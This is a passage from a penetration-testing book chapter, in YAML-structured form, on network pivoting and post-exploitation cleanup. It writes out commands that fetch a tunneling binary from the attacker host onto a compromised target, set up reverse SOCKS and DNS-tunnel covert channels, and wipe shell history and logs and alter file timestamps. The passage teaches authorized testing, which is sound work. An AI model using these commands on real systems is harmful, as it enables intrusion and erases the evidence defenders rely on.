+- en: '**proxychains -q** : This tells the system to use proxychains for the following
+    command. The **-q** option makes proxychains quiet.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**nmap** : The network mapping tool we’re using.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-sT** : This flag tells **nmap** to perform a TCP connect scan. You can’t
+    perform a TCP SYN or UDP scan through a SOCKS proxy. The scan must be a TCP connect
+    scan.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-p-** : This flag tells **nmap** to scan all ports ( **1** - **65535** ).'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**[target_ip]** : Replace this with the IP address you want to scan.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: In this case, our current target doesn’t have SSH exposed. You’ll learn how
+    to pivot when SSH isn’t available in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Be aware that scanning through a SOCKS proxy is very slow. You may want to restrict
+    your scans to a limited number of ports. An alternative is to transfer a tool
+    such as Goscan to the pivot host and scan from there. You can find Goscan at [https://github.com/sdcampbell/goscan](https://github.com/sdcampbell/goscan)
+    . ProjectDiscovery Naabu is another option.
+  prefs: []
+  type: TYPE_NORMAL
+- en: These basic pivoting techniques provide a foundation for accessing restricted
+    network segments during pentesting. They allow you to extend your reach within
+    a target environment, facilitating further exploration and testing of internal
+    systems. We’ll explore more advanced pivot ing techniques in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Mastering advanced pivoting and lateral movement
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this section, we’ll explore advanced pivoting and lateral movement techniques
+    using Bash scripting. These methods go beyond basic SSH tunneling and SOCKS proxies,
+    focusing on more sophisticated approaches to navigate complex network environments.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Dynamic chain pivoting
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**Dynamic chain pivoting** involves creating a series of interconnected pivots
+    to reach deeper into a network. This technique is particularly useful when you’re
+    dealing with segmented networks or when you need to bypass multiple layers of
+    security.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a Bash script that automates the process of setting up a dynamic pivot
+    chain. You can find this script in this chapter’s GitHub repository as **ch12_dynamic_pivot.sh**
+    :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE21]'
+  prefs: []
+  type: TYPE_PRE
+- en: Run this script on the attacker machine. This script sets up a chain of SSH
+    tunnels through multiple pivot hosts. It starts by creating a local port forward
+    on the attacker machine, then chains through each pivot host, ultimately reaching
+    the target. The script uses a loop to create each link in the chain, with special
+    handling for the first and last pivots.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: SSH provides an easier way to do the same thing using jump hosts. The syntax
+    of the SSH command to use multiple jump hosts is **ssh -J** **user1@jumphost1,user2@jumphost2
+    user3@targethost** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: Dynamic chain pivoting can be performed without SSH access using external tools.
+    Two related tools are Chisel ( [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+    ) and Ligolo-ng ( [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+    ). These tools can be used in situations where you don’t have an SSH server to
+    pivot through. They require you to upload a single executable to the pivot host
+    and don’t require root privileges to operate.
+  prefs: []
+  type: TYPE_NORMAL
+- en: I’ll be using Chisel in this example.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Making a note of my Kali system’s current IP address, I’ll start an HTTP server
+    to transfer Chisel over to the target by entering the **python3 -m http.server**
+    command in the same directory where I’ve downloaded Chisel.
+  prefs: []
+  type: TYPE_NORMAL
+- en: On the target system where I have a shell as **user6** , I’ll download the Chisel
+    file in the **/tmp** directory using the **wget** [http://10.0.0.66:8000/chisel](http://10.0.0.66:8000/chisel)
+    command. You must make it executable before you can run it using the **chmod +x
+    chisel** command. You must also run the same command on Kali because you’ll need
+    to run Chisel on both ends of the connection.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, start Chisel on Kali using the **./chisel server -p 8001 –reverse** command.
+    Then, on the target (pivot) system, run the **./chisel client 10.0.0.66:8001 R:1080:socks**
+    command. Ensure that you replace the IP address with your own as appropriate.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let’s see this in action. In the following screenshots, Kali has an IP address
+    of **10.0.0.66** . The firewall at **10.0.0.149** has exposed a web server on
+    port **80** . This web server is hosted at **10.1.1.103** on the other side of
+    the firewall. I’ll use the Chisel SOCKS proxy to scan a Windows host on the **10.1.1.0/24**
+    network, on the other side of the firewall from Kali.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure shows using Python to transfer the Chisel file before
+    running the command to start the Chisel server:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.12: Chisel is served to the pivot target from Kali and the server
+    side is started](image/B22229_12_12.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: 'Figure 12.12: Chisel is served to the pivot target from Kali and the server
+    side is started'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure demonstrates the commands that have been run on the target
+    to transfer Chisel and start the client side of the connection:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.13: Chisel is started on the pivot host in client mode, completing
+    the reverse SOCKS connection](image/B22229_12_13.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: 'Figure 12.13: Chisel is started on the pivot host in client mode, completing
+    the reverse SOCKS connection'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'With the connection established, we can use **proxychains** to scan through
+    the **SOCKS** tunnel:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.14: Kali scans a Windows host through the SOCKS proxy](image/B22229_12_14.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: 'Figure 12.14: Kali scans a Windows host through the SOCKS proxy'
+  prefs: []
+  type: TYPE_NORMAL
+- en: We’ve only scratched the surface of Chisel’s capabilities. You can use Chisel
+    to pivot through multiple hops into a network.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Ligolo-ng works differently. Instead of creating a SOCKS proxy, it creates a
+    userland network stack that works much like a VPN connection to route network
+    traffic through a tunnel. You can find the tool, documentation, and command examples
+    at [https://github.com/Nicocha30/ligolo-ng](https://github.com/Nicocha30/ligolo-ng)
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: In some cases, you may not be able to establish outbound connections from an
+    internal network to the Internet. In the next section, we’ll explore **DNS tunneling**
+    as a slower yet dependable pivot technique.
+  prefs: []
+  type: TYPE_NORMAL
+- en: DNS tunneling
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: DNS tunneling can be used to bypass firewalls and establish a covert channel
+    for pivoting. I’ve used this technique when plugging miniature computers such
+    as a Raspberry Pi into a network port to establish a covert tunnel out of restricted
+    networks when outbound SSH or Wireguard connections were blocked. I’ve also used
+    DNS tunneling as a failover for remote testing devices sent to client sites. If
+    network restrictions prevented the testing device from connecting back to me,
+    I can still establish a connection via the DNS tunnel and complete the pentest.
+  prefs: []
+  type: TYPE_NORMAL
+- en: I’ve found that it may be difficult for some to understand how DNS tunneling
+    works and you may assume that if port **53** outbound to the internet is blocked,
+    then you’re blocking DNS tunneling. That is simply not true.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a step-by-step breakdown of how DNS tunneling typically works:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The client, which is the device attempting to bypass network restrictions, creates
+    a DNS query that contains encoded data as the subdomain name. This data might
+    be part of a command, file, or other information that needs to be sent to an external
+    server. The query is typically for a subdomain of a domain that’s controlled by
+    the attacker or the legitimate service using DNS tunneling.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The client’s DNS query is sent to the DNS server that’s been configured for
+    the network interface. The network DNS server can’t resolve the subdomain, so
+    it forwards the request to the authoritative DNS server for the domain.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The DNS query traverses the normal DNS resolution process, eventually reaching
+    an authoritative DNS server controlled by the attacker.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: This server is configured to understand the encoded data within the DNS query.
+    The authoritative DNS server decodes the data from the query, processes it (that
+    is, executes a command), and then encodes a response within a DNS reply.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The response is sent back to the client in the form of a DNS response, which
+    appears to be a regular DNS response to any network monitoring system.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The client receives the DNS response and decodes the data. This could be an
+    acknowledgment, a piece of a file being exfiltrated, or a response to a command
+    that was sent earlier.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The process repeats as necessary, with the client and server continuing to communicate
+    covertly via DNS queries and responses.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: All except the most locked-down networks are going to forward requests for subdomains
+    that can’t be resolved from the internal network DNS server to the authoritative
+    server for the domain. This means that if you have to tunnel out of a network
+    that requires all outbound network traffic to either be allowed with a firewall
+    rule or otherwise must go through an HTTP/S proxy, you can bypass these network
+    restrictions by utilizing DNS tunneling. It’s slow, hence why DNS tunneling is
+    normally used as a last resort.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To use this technique, you’ll need to set up an **iodined** server on a host
+    that’s been exposed to the internet and ensure that it’s authoritative for the
+    domain you’re using for tunneling.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'See the iodined project documentation for configuration and execution instructions:
+    [https://github.com/yarrick/iodine](https://github.com/yarrick/iodine) .'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Be aware that a DNS tunnel is plaintext or unencrypted communications. Be sure
+    to encrypt traffic through the tunnel. When used to communicate with a small drop
+    box or remote testing device, I establish an SSH session through the DNS tunnel.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This concludes our discussion on pivoting. At this point, you’ve learned how
+    to use SSH and external tools to establish forward and reverse pivot tunnels,
+    from basic through advanced scenarios. In the next section, we’ll discuss cleaning
+    up and covering our tracks post-exploitation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cleanup and covering tracks
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In pentesting, it’s essential to clean up after completing your assessment.
+    This process involves removing any artifacts, logs, or traces that might indicate
+    your presence on the system. This section covers various techniques you can use
+    to clean up and cover your tracks using Bash scripting.
+  prefs: []
+  type: TYPE_NORMAL
+- en: One of the first steps in cleaning up is to clear the command history. This
+    prevents the system administrator from seeing the commands you’ve executed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **history** command will clear and write an empty command history – that
+    is, **history -cw** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **history -c** command clears the current session’s history from memory,
+    while the **history -w** command writes the (now empty) history to the history
+    file, effectively erasing the previous contents.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Deleting the **~/.bash_history** file doesn’t clear the history because ending
+    your current session will cause all commands that were entered during the session
+    to be written to the recreated file on exit.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You can also prevent any command history from being recorded by setting the
+    **HISTFILE** environment variable to **/dev/null** at the start of a Bash session
+    using the **set** **HISTFILE=/dev/null** command.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'System logs often contain evidence of your activities. Here’s a script you
+    can use to clear common log files. You can find it in this chap ter’s GitHub repository
+    as **ch12_clear_logs.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE22]'
+  prefs: []
+  type: TYPE_PRE
+- en: This script iterates through an array of common log files. For each file that
+    exists, it overwrites the contents with an empty string, effectively clearing
+    the log. Of course, it requires root access to clear these files.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To make your activities less obvious, you can modify the timestamps of files
+    you’ve accessed or modified. The following script will modify an array of files
+    by changing the timestamp so that it matches the **/etc/hosts** file. You can
+    find it in this chap ter’s GitHub repository as **ch12_timestamps.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE23]'
+  prefs: []
+  type: TYPE_PRE
+- en: This script uses the **touch** command with the **-r** option to set the timestamp
+    of each file in the list to match that of a reference file (in this case, **/etc/hosts**
+    ).
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'For sensitive files that need to be completely erased, use the **shred** command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE24]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command overwrites the file with random data three times ( **-n 3** ),
+    then with zeros ( **-z** ), and finally removes the file ( **-u** ).
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If you’ve made network connections, you might want to clear the ARP cache:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE25]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command flushes all entries from the ARP cache.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a comprehensive cleanup script that combines several of these techniques.
+    It can be found in this chapter’s GitHub repository as **ch12_cleanup.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE26]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'This script performs the following actions:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Clears the Bash history
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Clears common log files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Removes temporary files that were created during the assessment
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Modifies the timestamps of important system files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Securely removes a sensitive file
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Flushes the ARP cache
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Remember, the effectiveness of these cleanup methods can vary depending on the
+    system configuration and monitoring tools in place.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Proper cleanup also relies on keeping detailed notes of your activities and
+    knowing your tools. Use of the **script** and **tee** commands to save a log file
+    of your activities is also helpful and can save the day when you eventually forget
+    to take screenshots for the pentest report. Always be aware of the indicators
+    of compromise that are left behind by your pentest tools. There are Windows and
+    Linux tools that snapshot and compare before and after running exploits. This
+    will enable you to properly vet new tools in an offline lab environment to ensure
+    they’re trustworthy, as well as provide a snapshot of system changes you can expect
+    from your tools and exploits.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following are a select few Linux snapshot tools:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**diff** **and cmp** :'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**diff** : A command-line tool that compares files line by line and outputs
+    the differences. It can be used to compare configuration files, logs, or other
+    text-based files before and after running an exploit.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**cmp** : Another command-line tool that compares two files byte by byte and
+    is useful for binary file comparison.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Tripwire** : A popular integrity monitoring tool that can be used to create
+    a baseline of the filesystem and compare it against the system’s state after an
+    exploit. It can alert you to changes in files, directories, and configurations.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Advanced Intrusion Detection Environment (AIDE)** : AIDE creates a database
+    of system files’ checksums, and it can be used to compare the system’s state before
+    and after running an exploit to detect changes in files and directories.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Linux Auditing System (Auditd)** : Auditd allows you to monitor and log system
+    calls and can be configured to track changes to files, directories, or even certain
+    types of system activity. Comparing audit logs before and after running an exploit
+    can help identify changes.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**OSSEC** : An open-source **host-based intrusion detection system** ( **HIDS**
+    ) that can monitor system files, registry keys, and other critical areas for changes.
+    It can be configured to alert you to modifications caused by an exploit.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'The following workflow will provide a snapshot of the changes that have been
+    caused by a tool or exploit:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Create a baseline snapshot** : Use the selected tool to take a snapshot of
+    the system before running the exploit. This snapshot will serve as the *before*
+    state.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**Execute the exploit** : Execute the exploit you’re testing on the system.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**Create a post-exploit snapshot** : Use the same tool to take a snapshot of
+    the system after running the exploit.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**Compare the snapshots** : Use the comparison features of the tools to analyze
+    the differences between the before and after snapshots, identifying any changes
+    made by the exploit. This will help you log and analyze the impact of the exploit
+    on the system.'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: This section provided a comprehensive primer on cleaning up after yourself and
+    covering tracks. Two good rules to operate by are to do no harm and clean up after
+    yourself. Always follow the Statement of Work and Rules of Engagement documents,
+    and communicate with any points of contact or system owners when in doubt.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This chapter explored the essential techniques of maintaining persistence and
+    executing pivoting operations during pentesting, with a focus on utilizing the
+    Bash shell. We began by examining the fundamentals of persistence, including methods
+    to establish long-term access to compromised systems through cron jobs, startup
+    scripts, and system service manipulation. The chapter then progressed to more
+    sophisticated persistence techniques, providing pentesters with a comprehensive
+    toolkit for ensuring continued access.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The latter half of this chapter shifted focus to network pivoting, starting
+    with basic concepts and moving on to advanced strategies. Here, we covered how
+    to implement port forwarding and tunneling mechanisms using SSH and other tools.
+    This chapter concluded with a section on cleanup procedures, detailing methods
+    you can use to erase command histories, manage logs, and minimize any digital
+    footprints that are left during the testing process. Throughout this chapter,
+    practical Bash scripts and commands were provided, accompanied by clear explanations
+    to ensure you can apply these techniques in real-world scenarios effectively.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we’ll explore pentest reporting using Bash scripting and
+    tools we can use to process data from tool output and formulate reports.
+  prefs: []
+  type: TYPE_NORMAL
